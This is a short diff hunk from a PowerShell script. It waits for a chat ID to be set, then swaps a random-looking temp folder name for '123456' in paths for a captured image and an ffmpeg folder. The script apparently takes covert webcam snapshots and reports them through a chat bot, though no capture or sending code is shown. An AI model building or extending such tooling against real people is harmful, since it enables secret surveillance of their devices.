@@ -24,9 +24,9 @@ while($chatID.length -eq 0){
     Sleep 10
 }
 
-$outputFolder = "$env:TEMP\8zTl45PSA"
-$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
-$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
+$outputFolder = "$env:TEMP\123456"
+$outputFile = "$env:TEMP\123456\captured_image.jpg"
+$tempFolder = "$env:TEMP\123456\ffmpeg"
 if (-not (Test-Path -Path $outputFolder)) {
     New-Item -ItemType Directory -Path $outputFolder | Out-Null
 }
